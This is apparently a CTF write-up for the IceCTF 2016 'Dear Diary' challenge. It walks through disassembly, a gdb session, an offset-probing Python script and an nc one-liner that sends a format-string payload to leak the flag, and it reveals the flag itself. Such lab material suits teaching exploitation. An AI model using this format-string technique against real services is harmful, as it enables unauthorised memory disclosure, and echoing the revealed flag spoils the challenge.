---
layout: post
title: "IceCTF 2016 Dear Diary"
date: 2016-09-05 10:19:37 +0200
comments: true
categories: wu
---

First thing : objdump -d diary

```
0804863d <flag>:
 804863d:       55                      push   %ebp
 804863e:       89 e5                   mov    %esp,%ebp
 8048640:       83 ec 28                sub    $0x28,%esp
 8048643:       65 a1 14 00 00 00       mov    %gs:0x14,%eax
 8048649:       89 45 f4                mov    %eax,-0xc(%ebp)
 804864c:       31 c0                   xor    %eax,%eax
 804864e:       c7 44 24 04 00 00 00    movl   $0x0,0x4(%esp)
 8048655:       00
 8048656:       c7 04 24 40 89 04 08    movl   $0x8048940,(%esp)
 804865d:       e8 9e fe ff ff          call   8048500 <open@plt>
 8048662:       89 45 f0                mov    %eax,-0x10(%ebp)
 8048665:       c7 44 24 08 00 01 00    movl   $0x100,0x8(%esp)
 804866c:       00
 804866d:       c7 44 24 04 a0 a0 04    movl   $0x804a0a0,0x4(%esp)
 8048674:       08
 8048675:       8b 45 f0                mov    -0x10(%ebp),%eax
 8048678:       89 04 24                mov    %eax,(%esp)
 804867b:       e8 00 fe ff ff          call   8048480 <read@plt>
 8048680:       8b 45 f4                mov    -0xc(%ebp),%eax
 8048683:       65 33 05 14 00 00 00    xor    %gs:0x14,%eax
 804868a:       74 05                   je     8048691 <flag+0x54>
 804868c:       e8 2f fe ff ff          call   80484c0 <__stack_chk_fail@plt>
 8048691:       c9                      leave
 8048692:       c3                      ret
```

There is a routine called "flag" wich open and read flag.txt

Let's run gdb
<!-- more -->

```
gdb-peda$ disass flag
Dump of assembler code for function flag:
...
   0x0804867b <+62>:    call   0x8048480 <read@plt>
   0x08048680 <+67>:    mov    eax,DWORD PTR [ebp-0xc]
...
```

So i created a flag.txt locally and run gdb

```
ghozt@maze:~/ice/diary_FLAGGED$ cat flag.txt
flagtestghozt
ghozt@maze:~/ice/diary_FLAGGED$ gdb ./diary
gdb-peda$ disass flag
Dump of assembler code for function flag:
...
   0x08048678 <+59>:    mov    DWORD PTR [esp],eax
   0x0804867b <+62>:    call   0x8048480 <read@plt>
   0x08048680 <+67>:    mov    eax,DWORD PTR [ebp-0xc]
...
gdb-peda$ b*0x08048680
Breakpoint 1 at 0x8048680
gdb-peda$ r
Starting program: /home/ghozt/ice/diary_FLAGGED/diary
...
ECX: 0x804a0a0 ("flagtestghozt\n")
...
```

Okay, flag.txt is read and stored at 0x804a0a0.

The program seems to have a format string bug, let's find the offset

```python
import struct
from socket import *


def grab(i):
  s = socket(AF_INET, SOCK_STREAM)
  s.connect(('diary.vuln.icec.tf',6501 ))
  s.recv(1024)
  s.recv(1024)
  s.send("1\n")
  s.recv(1024)
  s.send("AAAA%"+str(i)+"$x\n")
  s.recv(1024)
  s.send("2\n")
  data = s.recv(1024)
  print i, data
  s.close()

l = []
for z in range(1,700):
  l.append(grab(z))
```

Execute it : 

```
ghozt@maze:~/ice/diary_FLAGGED$ python exploit.py
1 AAAAf7e57836

2 AAAAf7fce000

3 AAAAffffc888
...
18 AAAA41414141
```

Got it ! 

Now lets read the flag ! 

```
ghozt@maze:~/ice/diary_FLAGGED$ python -c 'print "1\n"+"\xa0\xa0\x04\x08%18$s\n2\n"' | nc diary.vuln.icec.tf 6501
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> Tell me all your secrets:
1. add entry
2. print latest entry
3. quit
> ▒IceCTF{this_thing_is_just_sitting_here}
```

Done !

By ghozt
